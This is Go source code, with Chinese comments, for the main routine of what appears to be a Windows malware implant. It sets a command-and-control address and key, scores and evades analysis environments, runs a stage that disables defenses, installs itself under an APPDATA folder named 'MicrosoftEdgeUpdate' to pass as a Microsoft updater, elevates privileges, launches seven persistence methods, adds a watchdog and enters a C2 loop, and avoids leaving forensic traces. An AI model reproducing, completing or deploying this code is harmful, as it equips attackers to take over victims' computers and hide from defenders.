package main

import (
	"flag"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// 编译期注入变量，构建脚本用 -ldflags -X 覆盖
var (
	BuildC2    = "127.0.0.1:8443"
	BuildPath  = "/api/v2/sync"
	BuildKey   = "0000000000000000000000000000000000000000000000000000000000000000"
	BuildDebug = "0"
)

var (
	flagSkipCheck bool
	logFile       *os.File
)

func logf(format string, a ...interface{}) {
	line := fmt.Sprintf("[%s] %s\n", time.Now().Format("15:04:05"), fmt.Sprintf(format, a...))
	if logFile != nil {
		logFile.WriteString(line)
	}
	if BuildDebug == "1" || flagSkipCheck {
		os.Stdout.WriteString(line)
	}
}

// Stage 阶段化执行链：任何一步失败都不退出，只记录
func stage(name string, fn func() error) {
	defer func() {
		if r := recover(); r != nil {
			logf("stage %s panic: %v", name, r)
		}
	}()
	logf("stage %s -> start", name)
	if err := fn(); err != nil {
		logf("stage %s -> err: %v", name, err)
		return
	}
	logf("stage %s -> ok", name)
}

func main() {
	flag.BoolVar(&flagSkipCheck, "skipcheck", false, "skip anti-analysis and on-disk install (debug)")
	flag.Parse()

	self, err := os.Executable()
	if err != nil {
		self = os.Args[0]
	}
	self, _ = filepath.Abs(self)
	workDir := installDir()

	if !flagSkipCheck {
		// 落地日志，便于本机自查
		os.MkdirAll(workDir, 0o700)
		logFile, _ = os.OpenFile(filepath.Join(workDir, ".g.log"), os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o600)
	}
	defer func() {
		if logFile != nil {
			logFile.Close()
		}
	}()

	logf("gati start pid=%d self=%s", os.Getpid(), self)

	// 1. 单实例互斥（用文件锁，避免 windows 命名互斥体留下的取证痕迹）
	if !flagSkipCheck {
		if err := singleInstance(workDir); err != nil {
			logf("already running, exit")
			return
		}
	}

	// 2. 反分析打分
	if !flagSkipCheck {
		if score, reasons := antiAnalysis(); score >= analysisThreshold {
			logf("analysis detected score=%d reasons=%v -> long sleep", score, reasons)
			evasiveSleep(score)
			// 退避结束后不退出，继续运行（秒退本身就是指纹）
		}
	}

	// 3. 关闭防御面
	if !flagSkipCheck {
		stage("defense-off", disarmDefenses)
	}

	// 4. 落地
	if !flagSkipCheck {
		stage("install", func() error { return installCopy(self, workDir) })
	}

	// 5. 提权
	if !flagSkipCheck {
		stage("elevate", elevate)
	}

	// 6. 持久化（七路并行，各自独立失败）
	if !flagSkipCheck {
		for _, p := range persistenceMethods() {
			m := p
			go stage("persist:"+m.name, m.fn)
		}
	}

	// 7. 看门狗：守护子进程
	if !flagSkipCheck {
		stage("watchdog", watchdog)
	}

	// 8. C2 主循环
	stage("c2", func() error { return c2Loop() })
}

func installDir() string {
	appData := os.Getenv("APPDATA")
	if appData == "" {
		appData = os.Getenv("LOCALAPPDATA")
	}
	if appData == "" {
		appData = os.TempDir()
	}
	return filepath.Join(appData, "MicrosoftEdgeUpdate")
}

func machineID() (string, error) {
	// 机器名 + 卷序列号派生，避开开机时长等易变量
	host, _ := os.Hostname()
	serial := volumeSerial("C:\\")
	h := sha256Sum([]byte(host + "|" + serial + "|" + os.Getenv("USERNAME")))
	return strings.ToUpper(h[:16]), nil
}

func runHidden(name string, args ...string) error {
	cmd := exec.Command(name, args...)
	hideWindow(cmd)
	return cmd.Run()
}
